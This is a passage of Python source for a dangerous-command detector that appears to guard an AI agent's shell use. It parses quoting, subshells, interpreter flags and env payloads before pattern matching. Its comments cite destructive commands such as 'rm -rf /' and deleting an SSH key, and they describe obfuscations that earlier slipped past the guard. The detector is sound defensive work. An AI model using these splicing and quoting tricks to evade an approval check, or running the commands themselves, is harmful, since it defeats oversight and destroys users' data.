                    i += 1 if takes_next else 0
                elif options and token.startswith("-") and token != "-":
                    chars = token[1:]
                    for j, char in enumerate(chars):
                        pcre = pcre or char == "P"
                        explicit_patterns = explicit_patterns or char in {"e", "f"}
                        if char in _GREP_SHORT_OPTIONS_WITH_ARG:
                            # The first argument-taking short option owns the rest of the bundle,
                            # or the next token when it comes last.
                            attached = j + 1 < len(chars)
                            if not attached and i + 1 >= len(args):
                                return [], True
                            if char == "e":
                                pattern_indexes.append(i if attached else i + 1)
                            i += 0 if attached else 1
                            break
                elif operand_index is None:
                    operand_index = i
                i += 1
            if not explicit_patterns:
                if operand_index is None:
                    return [], pcre
                pattern_indexes.append(operand_index)
            if pcre:
                spans.extend(
                    (segment_at + token_start, segment_at + token_end)
                    for _, token_start, token_end, quoted in map(args.__getitem__, pattern_indexes) if quoted
                )
    return spans, False


def _splice(command: str, edits) -> str:
    """Apply sorted, non-overlapping ``(start, end, text)`` edits to *command* in one pass
    (re-slicing per edit is quadratic on 10k+ segments)."""
    parts, previous = [], 0
    for start, end, text in edits:
        parts.extend((command[previous:start], text))
        previous = end
    return "".join(parts) + command[previous:]


def _grep_safe_detection_variant(command: str) -> tuple[str, bool]:
    spans, malformed = _quoted_grep_pattern_spans(command)
    if malformed or not spans:
        return command, malformed
    return _splice(command, [(start, end, " " * (end - start)) for start, end in spans]), False


def _interpreter_family(executable: str) -> str | None:
    name = os.path.basename(executable).lower()
    return next((family for family, name_re in _INTERPRETER_NAME_RES if name_re.fullmatch(name)), None)


def _shell_segment_tokens(segment: str, start: int) -> list[str] | None:
    """Tokenize an already-bounded command segment. ``None`` distinguishes malformed quoting from
    an empty segment so callers can fail closed for a program-bearing option rather than silently
    skip it."""
    try:
        lexer = shlex.shlex(segment[start:], posix=True, punctuation_chars="<>")
        lexer.whitespace_split, lexer.commenters = True, ""
        return list(lexer)
    except ValueError:
        return None


def _iter_top_level_shell_segments(command: str):
    """Yield top-level command segments in one left-to-right pass."""
    start = 0
    for kind, i, j, quote in _scan_shell(command, comments=True):
        if kind == "comment" or (kind == "char" and quote is None and command[i] in ";&|\n"):
            if start < i:
                yield command[start:i]
            start = j
    if start < len(command):
        yield command[start:]


def _interpreter_exec_flag(family: str, args: list[str]) -> str | None:
    """Return an execution-bearing interpreter option, if present."""
    flags, with_arg = _INTERPRETER_EXEC_FLAGS[family], _INTERPRETER_WITH_ARG[family]
    # Deno evaluates inline scripts via a bare `eval` subcommand rather than a dash flag, and
    # only as the first argument; a later positional `eval` stays data.
    if family == "deno" and args and args[0].lower() == "eval":
        return "eval"
    powershell = family == "powershell"
    skip_value = False
    for token in args:
        if skip_value:
            skip_value = False
            continue
        if token == "--" or (not powershell and not token.startswith("-")):
            break
        option, equals, _ = token.partition("=")
        comparable = option.lower() if powershell else option
        if comparable in flags:
            return comparable
        # `-Wonce` and `ruby -rjson` attach an option value; they are not short-option bundles containing an execution
        # flag. PowerShell's normal long options also use one dash, so bundle parsing never applies to that family.
        has_attached_option_value = any(
            option.startswith(short) and len(option) > len(short)
            for short in with_arg if short.startswith("-") and not short.startswith("--")
        )
        if not powershell and not option.startswith("--") and len(option) > 2 and not has_attached_option_value:
            bundled = next((f"-{char}" for char in option[1:] if f"-{char}" in flags), None)
            if bundled:
                return bundled
        skip_value = comparable in with_arg and not equals
    return None


def _bash_exec_payload(args: list[str]) -> tuple[bool, str | None]:
    """Return whether Bash ``-c`` occurs and the command string it owns.
    Bash's O/o options consume the following argument even when they precede a later ``-c`` or
    share its short-option bundle; the two startup-file long options own their next token.
    Parsing those first prevents both missed payloads and false ``-c`` hits."""
    index = 0
    while index < len(args):
        token = args[index]
        if token == "--" or not token.startswith(("-", "+")):
            break
        if token in _BASH_OPTIONS_WITH_ARG:
            index += 2
            continue
        chars = token[1:]
        # Bash option letters are case-sensitive; restricting to the documented alphabet
        # preserves invalid controls such as `-Wc`.
        if token.startswith("--") or not set(chars) <= _BASH_SHORT_OPTION_LETTERS:
            index += 1
            continue
        consumed_option_arg = int("O" in chars or "o" in chars)
        if "c" in chars:
            payload_index = index + 1 + consumed_option_arg
            return True, (args[payload_index] if payload_index < len(args) else None)
        index += 1 + consumed_option_arg
    return False, None


def _read_tool_exec_flag(tool: str, args: list[str]) -> tuple[str, str] | None:
    """Return (option, program) for a read-only tool's program-running flag."""
    flags = _READ_TOOL_EXEC_FLAGS[tool]
    index = 0
    while index < len(args):
        token = args[index]
        if token == "--":
            break
        option, equals, payload = token.partition("=")
        payload = payload if equals else None
        matched = option if option in flags else None
        if tool == "man" and token.startswith(("-P", "-H")) and len(token) > 2:
            matched, payload = token[:2], token[2:]
        if matched:
            if payload is None and index + 1 < len(args):
                payload = args[index + 1]
            # The option owns its program argument regardless of spelling; the real binaries
            # execute a '-'-prefixed payload rather than reparsing it.
            if payload:
                return matched, payload
            index += 2 if payload is not None and "=" not in token else 1
        elif option in _READ_TOOL_LONG_OPTIONS_WITH_ARG[tool] and payload is None:
            index += 2
        elif token.startswith("-") and not token.startswith("--") and len(token) > 1:
            # In a short bundle, the first argument-taking option owns the rest of the token, or
            # the following token when it occurs last.
            shorts = _READ_TOOL_SHORT_OPTIONS_WITH_ARG[tool]
            owner = next((k for k, char in enumerate(token[1:], start=1) if char in shorts), None)
            index += 2 if owner == len(token) - 1 else 1
        else:
            index += 1
    return None


def _execution_flag_findings(command: str):
    """Yield scoped execution mechanisms and any executable payloads."""
    for segment in _iter_top_level_shell_segments(command):
        for start, _, word in _iter_shell_command_word_spans(segment):
            executable = _deobfuscate_shell_word_for_detection(word)
            tokens = _shell_segment_tokens(segment, start)
            executable_name = os.path.basename(executable).lower()
            family = _interpreter_family(executable)
            if tokens is None:
                if family is not None or executable_name in _READ_TOOL_EXEC_FLAGS:
                    yield (_MALFORMED_EXEC_DESCRIPTION, None)
                continue
            if not tokens:
                continue
            args = tokens[1:]
            if family and _interpreter_exec_flag(family, args):
                yield ("script execution via -e/-c flag", None)
            elif family and any(token.startswith("<<") for token in args):
                yield ("script execution via heredoc", None)
            else:
                if executable_name in _SHELL_NAMES:
                    found, payload = _bash_exec_payload(args)
                    if found:
                        yield ("shell command via -c/-lc flag", payload)
                if executable_name in _READ_TOOL_EXEC_FLAGS:
                    finding = _read_tool_exec_flag(executable_name, args)
                    if finding:
                        yield (f"arbitrary program execution via {executable_name} {finding[0]}", finding[1])


def _skip_shell_whitespace(command: str, pos: int) -> int:
    while pos < len(command) and command[pos].isspace():
        pos += 1
    return pos


def _scan_shell(text: str, start: int = 0, end: int | None = None, *, subst: str = "",
                brace: bool = False, stop_unterminated: bool = False, naive_backtick: bool = False,
                comments: bool = False):
    """Yield ``(kind, i, j, quote)`` lexical steps over ``text[start:end]`` without expanding.

    The single quote/escape state machine behind every detection scanner. ``kind`` is ``"char"``
    (one char), ``"esc"`` (backslash + the char it escapes; never inside single quotes), ``"quote"``
    (an opening/closing quote char) or ``"subst"`` (a ``$(...)`` / backtick / ``${...}`` span);
    With *comments*, ``"comment"`` spans are skipped without interpreting their quote syntax.
    ``quote`` is the state the step was read in (``None``, ``'`` or ``"``). Substitutions are
    recognized unquoted when ``"u"`` is in *subst*, inside double quotes when ``"q"`` is; *brace*
    adds unquoted ``${...}``. An unterminated substitution falls through as plain chars unless
    *stop_unterminated*, which yields ``("subst", i, None, quote)`` and ends the scan (the caller
    descends to *end* itself). *naive_backtick* closes a backtick at the next backtick even if
    escaped (the quoted-prose masker's historical behavior)."""
    n = len(text) if end is None else end
    quote: str | None = None
    i = start
    while i < n:
        ch = text[i]
        kind, j = "char", i + 1
        if comments and quote is None and _is_shell_comment_start(text, i):
            kind, j = "comment", text.find("\n", i, n)
            if j < 0:
                j = n
        elif quote != "'" and ch == "\\" and i + 1 < n:
            kind, j = "esc", i + 2
        elif ch == quote or (quote is None and ch in "'\""):
            kind = "quote"
        elif quote != "'" and ("q" if quote else "u") in subst and (
            ch == "`" or text.startswith("$(", i) or (brace and not quote and text.startswith("${", i))
        ):
            if ch == "`":
                close = text.find("`", i + 1) + 1 or None if naive_backtick else _scan_backtick_end(text, i)
            elif text[i + 1] == "(":
                close = _scan_dollar_paren_end(text, i)
            else:
                close = text.find("}", i + 2) + 1 or None
            if close is not None:
                kind, j = "subst", close
            elif stop_unterminated:
                yield ("subst", i, None, quote)
                return
        yield (kind, i, j, quote)
        if kind == "quote":
            quote = None if quote else ch
        i = j


def _scan_dollar_paren_end(command: str, start: int) -> int | None:
    """Return the offset after a balanced ``$(...)`` command substitution."""
    depth = 1
    for kind, i, _, quote in _scan_shell(command, start + 2):
        if kind == "char" and not quote:
            depth += command.startswith("$(", i) - (command[i] == ")")
            if depth == 0:
                return i + 1
    return None


def _scan_backtick_end(command: str, start: int) -> int | None:
    # Backticks have no quote awareness: only a backslash escapes the next char.
    match = re.compile(r"(?:\\.|[^`\\])*`", re.DOTALL).match(command, start + 1)
    return match.end() if match else None


def _read_shell_word(command: str, pos: int) -> tuple[int, int, str]:
    """Read one shell word without executing expansions."""
    start = end = _skip_shell_whitespace(command, pos)
    for kind, i, j, quote in _scan_shell(command, start, subst="u", brace=True):
        if kind == "char" and quote is None and (command[i].isspace() or command[i] in ";&|<>()"):
            break
        end = j
    return (start, end, command[start:end])


def _literal_command_substitution_output(script: str) -> str | None:
    """Resolve tiny literal command substitutions without executing a shell."""
    try:
        tokens = shlex.split(script, posix=True)
    except ValueError:
        tokens = []
    if not tokens:
        return None
    command, args = tokens[0].lower(), tokens[1:]
    if command == "echo":
        while args and re.fullmatch(r"-[nEe]+", args[0]):
            args = args[1:]
    elif command != "printf":
        return None
    if len(args) == 1 and _SIMPLE_SHELL_LITERAL_RE.fullmatch(args[0]):
        return args[0]
    if command == "printf" and len(args) == 2 and args[0] == "%s" and _SIMPLE_SHELL_LITERAL_RE.fullmatch(args[1]):
        return args[1]
    return None


def _replace_simple_command_substitutions(word: str) -> str:
    chars: list[str] = []
    i = 0
    while i < len(word):
        opener = 2 if word.startswith("$(", i) else 1 if word[i] == "`" else 0
        end = (_scan_dollar_paren_end if opener == 2 else _scan_backtick_end)(word, i) if opener else None
        replacement = _literal_command_substitution_output(word[i + opener:end - 1]) if end is not None else None
        if replacement is None:
            replacement, end = word[i], i + 1
        chars.append(replacement)
        i = end
    return "".join(chars)


def _replace_simple_shell_expansions(word: str) -> str:
    word = _replace_simple_command_substitutions(word)
    word = _PARAM_REPLACEMENT_RE.sub(lambda match: match.group("replacement"), word)
    return _PARAM_DEFAULT_RE.sub(lambda match: match.group("default"), word)


def _strip_shell_word_syntax(word: str) -> str:
    return "".join(
        word[i + 1] if kind == "esc" else word[i]
        for kind, i, _, _ in _scan_shell(word) if kind != "quote"
    )


def _deobfuscate_shell_word_for_detection(word: str) -> str:
    """Approximate how shell syntax can spell a command word: collapses quoting/escaping plus
    simple literal command substitutions in the word itself. Intentionally narrow and non-executing."""
    for _ in range(2):
        previous = word
        word = _strip_shell_word_syntax(_replace_simple_shell_expansions(word))
        if word == previous:
            break
    return word


def _is_shell_comment_start(command: str, index: int) -> bool:
    return command[index] == "#" and (index == 0 or command[index - 1].isspace()
                                      or command[index - 1] in ";&|()<>")


def _iter_shell_command_starts(command: str):
    starts = [0]

    def scan(start: int, end: int) -> None:
        skip = -1
        for kind, i, j, quote in _scan_shell(command, start, end, subst="uq", stop_unterminated=True,
                                            comments=True):
            if kind == "subst":
                # Record a nested $(...)/backtick command start and scan its body.
                inner = i + (1 if command[i] == "`" else 2)
                starts.append(inner)
                scan(inner, end if j is None else j - 1)
            elif kind == "char" and quote is None and i != skip:
                # `{` opens a brace group only as its own word (after whitespace or a separator): `${IFS}`
                # is a parameter expansion and `-{delete,print}` a brace-expansion word, and a start
                # marked inside either splits the word the flat patterns need to see intact.
                if command[i] in "(;\n" or (command[i] == "{" and (i == 0 or command[i - 1].isspace()
                                                                   or command[i - 1] in "(;&|)")):
                    starts.append(i + 1)
                elif command[i] in "&|":
                    repeated = i + 1 < end and command[i + 1] == command[i]
                    skip = i + 1 if repeated else skip
                    starts.append(i + 1 + repeated)

    scan(0, len(command))
    seen = set()
    for start in starts:
        start = _skip_shell_whitespace(command, start)
        if start >= len(command) or start in seen or _is_shell_comment_start(command, start):
            continue
        seen.add(start)
        yield start
        _, end, word = _read_shell_word(command, start)
        if word in _SHELL_COMMAND_TRANSITIONS:
            starts.append(end)


def _mark_command_starts(command: str, marker: str = "\n") -> str:
    """Insert *marker* (a newline) before each real (quote-aware) command start.
    ``\\n`` is already a ``_CMDPOS`` separator, so this exposes subshell ``(cmd)`` and brace-group
    ``{ cmd; }`` openers — which the flat pattern class omits — to the anchored patterns WITHOUT the
    quoted-prose false positives that adding ``(`` / ``{`` to ``_CMDPOS`` would cause: starts inside
    quotes are never produced, so ``--title "block (reboot)"`` is left as-is."""
    offsets = sorted(o for o in _iter_shell_command_starts(command) if o > 0)
    return _splice(command, [(o, o, marker) for o in offsets]) if offsets else command


def _mask_quoted_newlines(command: str) -> str:
    """Replace raw newlines inside single/double quotes with a space (detection-only).
    A quoted newline is DATA to the shell, yet the flat ``_CMDPOS`` class treats every raw ``\\n``
    as a command start, so multi-line quoted arguments (commit messages, heredoc text) tripped the
    hardline blocklist when a data line began with e.g. ``sudo reboot``. Quote tracking mirrors
    ``_iter_shell_command_starts``. Unquoted newlines pass through and ``_mark_command_starts``
    still re-inserts newlines at genuine starts; an unclosed quote absorbs following newlines
    exactly as the shell would, so masking them cannot hide a runnable command."""
    if "\n" not in command:
        return command
    return _mask_quoted_newlines_span(command, 0, len(command))


def _mask_quoted_newlines_span(command: str, start: int, end: int) -> str:
    """``_mask_quoted_newlines`` over ``command[start:end]``. A ``$(...)`` / backtick substitution
    inside double quotes is EXECUTABLE, not data: its body is re-scanned with a fresh quote state so a
    newline that separates commands inside it survives as a command boundary. Masking it as quoted
    data turned ``"$(grep x f\nreboot)"`` into ``... f reboot)``, which no later stage can tell from an
    operand; the pre-fix scanner only caught it by refusing the whole command as malformed."""
    out: list[str] = []
    for kind, i, j, quote in _scan_shell(command, start, end, subst="q"):
        if kind == "subst":
            # j is the index just past the closer; keep the opener and closer, recurse into the body.
            body_start = i + (2 if command.startswith("$(", i) else 1)
            body_end = j - 1
            out.append(command[i:body_start])
            out.append(_mask_quoted_newlines_span(command, body_start, body_end))
            out.append(command[body_end:j])
        elif quote and kind == "char" and command[i] == "\n":
            out.append(" ")
        else:
            out.append(command[i:j])
    return "".join(out)


def _iter_shell_command_word_spans(command: str):
    """Yield command-position words that may be executable names."""
    for pos in _iter_shell_command_starts(command):
        wrapper, positionals = None, 0
        options, skip_arg = True, False
        while pos < len(command):
            redirect = _SHELL_REDIRECTION_RE.match(command, _skip_shell_whitespace(command, pos))
            if redirect:
                _, pos, _ = _read_shell_word(command, redirect.end())
                continue
            word_start, word_end, word = _read_shell_word(command, pos)
            if word_start == word_end:
                break
            pos = word_end
            deobfuscated = _deobfuscate_shell_word_for_detection(word)
            name = os.path.basename(deobfuscated).lower()
            if skip_arg:
                skip_arg = False
                continue
            if wrapper and options and deobfuscated == "--":
                options = False
                continue
            if wrapper and options and deobfuscated.startswith("-"):
                option = deobfuscated.split("=", 1)[0]
                if wrapper == "env" and (option == "--split-string" or deobfuscated.startswith("-S")):
                    # The split string and remaining argv form ONE command, handled
                    # by _env_split_payload; the suffix is not a new executable.
                    break
                queries = _COMMAND_WRAPPER_NON_EXECUTING_OPTIONS.get(wrapper, set())
                if option in queries or (wrapper == "command" and not option.startswith("--")
                                         and set(option[1:]) & {"v", "V"}):
                    break
                skip_arg = "=" not in deobfuscated and option in _COMMAND_WRAPPER_OPTIONS_WITH_ARG.get(wrapper, set())
                continue
            if positionals:
                positionals -= 1
                continue
            if _ENV_ASSIGNMENT_RE.fullmatch(word):
                continue
            yield (word_start, word_end, word)
            if name not in _COMMAND_WRAPPER_WORDS:
                break
            wrapper, options = name, True
            positionals = _COMMAND_WRAPPER_POSITIONAL_ARGS.get(name, 0)


def _shell_command_segment(command: str, start: int) -> str:
    """Bound a candidate to its command, preserving quoted argument bytes."""
    end = len(command)
    for kind, i, _, quote in _scan_shell(command, start, subst="uq", brace=True, comments=True):
        if kind == "comment" or (kind == "char" and quote is None and command[i] in ";&|\n)`"):
            end = i
            break
    return command[start:end].strip()


def _split_env_string(payload: str) -> list[str] | None:
    r"""Project GNU env -S literal argv, not POSIX shell words.

    Dynamic ${NAME} expansion is deliberately not evaluated: the execution
    backend's environment need not be this process's environment.
    """
    escapes = {"f": "\f", "n": "\n", "r": "\r", "t": "\t", "v": "\v",
               "#": "#", "$": "$", "\"": "\"", "'": "'", "\\": "\\"}
    args, word = [], []
    quote, started, index = None, False, 0
    while index < len(payload):
        char = payload[index]
        index += 1
        if char == "\\":
            if index == len(payload):
                return None
            escaped = payload[index]
            if quote == "'" and escaped not in ("'", "\\"):
                word.append(char)
                started = True
                continue
            index += 1
            if escaped == "c":
                if quote:
                    return None
                break
            if escaped == "_" and quote is None:
                if started:
                    args.append("".join(word))
                word, started = [], False
                continue
            if escaped not in escapes and escaped != "_":
                return None
            word.append(" " if escaped == "_" else escapes[escaped])
            started = True
            continue
        if char in ("'", '"') and (quote is None or char == quote):
            quote = char if quote is None else None
            started = True
            continue
        if quote is None and char in " \t\n\r\v\f":
            if started:
                args.append("".join(word))
            word, started = [], False
            continue
        if quote is None and char == "#" and not started:
            break
        if char == "$" and quote != "'":
            return None
        word.append(char)
        started = True
    if quote:
        return None
    if started:
        args.append("".join(word))
    return args


def _env_split_payload(tokens: list[str]) -> str | None:
    index = 1
    while index < len(tokens):
        token = tokens[index]
        if token == "--" or not token.startswith("-"):
            return None
        option, equals, value = token.partition("=")
        if option == "--split-string" or token.startswith("-S"):
            attached = equals if option == "--split-string" else len(token) > 2
            if not attached:
                index += 1
            payload = (value if option == "--split-string" else token[2:]) if attached else (
                tokens[index] if index < len(tokens) else "")
            args = _split_env_string(payload)
            # Protect literal separators when reusing command-position detection;
            # only a real shell -c carrier may turn these argv bytes into code.
            return shlex.join(args + tokens[index + 1:]) if args is not None else None
        index += 2 if not equals and option in _COMMAND_WRAPPER_OPTIONS_WITH_ARG["env"] else 1
    return None


def _deny_command_variants(command: str):
    """Add executable projections without reparsing normalized argument data.

    Whole-input matching is retained for existing globs. New projections parse
    the original quote state, preserve path-specific rules, and fold only the
    executable basename (never arbitrary argument paths).
    """
    yield from _command_detection_variants(command)
    pending, seen = [command], set()
    while pending:
        source = pending.pop()
        if source in seen:
            continue
        seen.add(source)
        for start, end, word in _iter_shell_command_word_spans(source):
            segment = _shell_command_segment(source, start)
            executable = _deobfuscate_shell_word_for_detection(word)
            tail = segment[end - start:]
            # Collapse only unquoted inter-word whitespace; quoted prose is data.
            parts = []
            for kind, i, j, quote in _scan_shell(tail):
                if kind == "char" and quote is None and tail[i].isspace():
                    if not parts or parts[-1] != " ":
                        parts.append(" ")
                else:
                    parts.append(tail[i:j])
            tail = "".join(parts)
            for name in dict.fromkeys((executable, os.path.basename(executable))):
                candidate = name + tail
                yield candidate
                # Apply the existing text matching semantics only AFTER locating
                # executable positions; never parse its rewritten quotes again.
                yield _normalize_command_for_detection(candidate)
            if os.path.basename(executable) == "env":
                tokens = _shell_segment_tokens(segment, 0)
                if tokens:
                    payload = _env_split_payload(tokens)
                    if payload:
                        pending.append(payload)
        for _, payload in _execution_flag_findings(source):
            if payload:
                pending.append(payload)


def _command_detection_variants(command: str):
    # Mask quoted newlines BEFORE normalization: normalization strips escapes (\" -> ") and ""
    # pairs, corrupting quote tracking (`echo "a\""` becomes an unterminated quote) so masking
    # afterwards could swallow a REAL unquoted newline separator. The raw command carries faithful quote state.
    normalized = _normalize_command_for_detection(_mask_quoted_newlines(command))
    # Quote-aware grep parsing hides only structurally identified pattern operands; malformed or
    # ambiguous input stays byte-for-byte intact.
    grep_safe, _ = _grep_safe_detection_variant(normalized)
    seen = {grep_safe}
    yield grep_safe

    def fresh(variant: str) -> bool:
        if not variant or variant in seen:
            return False
        seen.add(variant)
        return True

    # Windows-path variant: normalization strips backslashes as shell escapes, so `del C:\Users\me\.ssh\id_rsa`
    # reaches the patterns as `del C:Usersme.sshid_rsa`. When the RAW command has a drive-letter or UNC backslash
    # path, also yield a variant with backslashes flattened to `/` BEFORE normalization. Gated on a real path shape so
    # POSIX escape semantics (`echo a\"b`) are untouched elsewhere.
    # See #69472.
    if re.search(r"(?:[A-Za-z]:|\\\\)[\\\\]", command) or re.search(r"[A-Za-z]:\\", command):
        win_variant = _normalize_command_for_detection(_mask_quoted_newlines(command.replace("\\", "/")))
        if fresh(win_variant):
            yield win_variant
    # Program-bearing options are parsed in their owning command's context; surfacing only the payload lets the
    # hardline floor inspect what will actually run without promoting similar flags or quoted prose.
    pending = [normalized]
    while pending:
        for _, payload in _execution_flag_findings(pending.pop()):
            if fresh(payload):
                yield payload
                # A payload may start with an option-looking program and then invoke a hardline command
                # after a separator; mark its starts.
                marked_payload = _mark_command_starts(payload)
                if marked_payload != payload and fresh(marked_payload):
                    yield marked_payload
                pending.append(payload)
    # Subshell `(cmd)` / brace-group `{ cmd; }` openers put `cmd` at a real command position the flat `_CMDPOS`
    # patterns can't see (adding `(`/`{` there would match quoted prose like `--title "(reboot)"`). Insert a newline
    # at each start the QUOTE-AWARE tokenizer found instead; this covers every `_CMDPOS` rule in one place.
    marked = _mark_command_starts(grep_safe)
    if marked != grep_safe and fresh(marked):
        yield marked
    # Every variant above tracks quotes on NORMALIZED text, where `\"` has already become `"`. That
    # flips quote parity, so in `cat "f\"n.txt"; rm -rf /` the `; rm` start sat "inside" a phantom
    # quote, no start was marked, and the hardline floor let it through. Mark starts on the RAW
    # command (only quoted newlines masked), then normalize; the leading space keeps the marker
    # from being eaten as a `\<newline>` continuation when the preceding text ends in a backslash.
    faithful = _normalize_command_for_detection(_mark_command_starts(_mask_quoted_newlines(command), marker=" \n"))
    if fresh(faithful):
        yield faithful
    # Quoting/escaping can spell an executable in pieces (r\m, r''m). Keep that deobfuscation scoped
    # to command words so arguments don't false-positive.
    # One variant with EVERY command word deobfuscated, not one full-length variant per word: a heredoc
    # body of quoted lines has hundreds of quoted command words, and per-word variants made both
    # detection passes O(words * len) — minutes of GIL-held regex on a 15 KB command (#113535).
    # Spans arrive out of order (loop/conditional bodies after their keywords) and can nest (a
    # backtick word and the command inside it), so apply them sorted; spans overlapping an applied
    # one wait for the next round, one combined variant per nesting level.
    pending = sorted(
        ((word_start, word_end, deobfuscated) for word_start, word_end, word in _iter_shell_command_word_spans(normalized)
         if (deobfuscated := _deobfuscate_shell_word_for_detection(word)) and deobfuscated != word),
        key=lambda span: span[:2],
    )
    while pending:
        applied, carry, cursor = [], [], 0
        for span in pending:
            if span[0] < cursor:
                carry.append(span)
            else:
                applied.append(span)
                cursor = span[1]
        variant = _splice(normalized, applied)
        if fresh(variant):
            yield variant
        pending = carry


def _is_verification_artifact_cleanup(command: str) -> bool:
    """Return whether *command* only removes one Hermes ad-hoc temp script."""
    try:
        argv = shlex.split(command, posix=True)
    except ValueError:
        return False
    if len(argv) != 3 or argv[0] != "rm" or argv[1] != "-f":
        return False
    operand = argv[2]
    temp_dir = os.path.realpath(tempfile.gettempdir())
    basename = os.path.basename(operand)
    return (
        operand == os.path.join(temp_dir, basename)
        and os.path.dirname(os.path.realpath(operand)) == temp_dir
        and re.fullmatch(r"hermes-(?:verify|ad-hoc)-[A-Za-z0-9_.-]+", basename) is not None
    )


def _is_shell_token_spliced_gateway_lifecycle(command: str) -> bool:
    """Catch gateway-lifecycle verbs spelled with quote splicing.
    Backslash splicing (``kick\\start``) is undone by normalization, but quote splicing is not:
    ``_deobfuscate_shell_word_for_detection`` is deliberately scoped to command-position words
    (widening it would let quoted prose like ``git commit -m "rm -rf /"`` match), and the spliced
    verb is an ARGUMENT, so ``launchctl kick"start" -k gui/501/ai.hermes.gateway`` auto-approved.
    Delegates to ``cron.lifecycle_guard`` (shlex-tokenized, anchored on a hermes-gateway
    identifier). Runs last so an ordinary pattern match keeps its more specific reason; this layer
    only prompts — the non-bypassable block still lives in ``cron.lifecycle_guard``.

    ``_normalize_command_for_detection`` strips backslash escapes, so ``kick\\start`` already reaches the
    launchctl pattern above. See #80269.
    """
    try:
        from cron.lifecycle_guard import contains_gateway_lifecycle_command
    except Exception:
        return False
    return contains_gateway_lifecycle_command(command)


def detect_dangerous_command(command: str) -> tuple:
    """Check dangerous patterns -> (is_dangerous, pattern_key, description)."""
    if _command_parser_limit_exceeded(command):
        return (True, _PARSER_LIMIT_DESCRIPTION, _PARSER_LIMIT_DESCRIPTION)
    if _is_verification_artifact_cleanup(command):
        return (False, None, None)
    for command_variant in _command_detection_variants(command):
        command_lower = command_variant.lower()
        masked_lower: str | None = None
        heredoc_masked_lower: str | None = None
        for pattern_re, description in DANGEROUS_PATTERNS_COMPILED:
            if description in _QUOTE_MASKED_DANGEROUS_DESCRIPTIONS:
                if masked_lower is None:
                    # Quoted text is DATA, except under a shell carrier (sh -c, eval, source, .)
                    # whose quoted argument is code the shell really runs — those scan raw, the
                    # same rule the hardline matcher applies above.
                    carrier = _contains_shell_carrier(command_lower)
                    masked_lower = command_lower if carrier else _mask_quoted_prose(command_lower)
                    # The command-word rules also treat heredoc BODIES as data (documentation written
                    # to a file through `cat <<EOF > doc.md`); the two dynamic-word rules predate that
                    # guard and keep their exact behaviour. Bodies are located before the quote mask
                    # runs: `_mask_quoted_prose` blanks a QUOTED delimiter (`<<'EOF'`).
                    heredoc_masked_lower = (
                        masked_lower if carrier
                        else _mask_quoted_prose(_mask_heredoc_bodies(command_lower))
                    )
                haystack = (
                    heredoc_masked_lower if description in _QUOTE_MASKED_COMMAND_DESCRIPTIONS else masked_lower
                )
                if haystack is not None and pattern_re.search(haystack):
                    return (True, description, description)
            elif pattern_re.search(command_lower):
                return (True, description, description)
    normalized = _normalize_command_for_detection(command)
    for description, _ in _execution_flag_findings(normalized):
        return (True, description, description)
    if _is_shell_token_spliced_gateway_lifecycle(command):
        return (True, _GATEWAY_LIFECYCLE_SPLICE_DESCRIPTION, _GATEWAY_LIFECYCLE_SPLICE_DESCRIPTION)
    return (False, None, None)
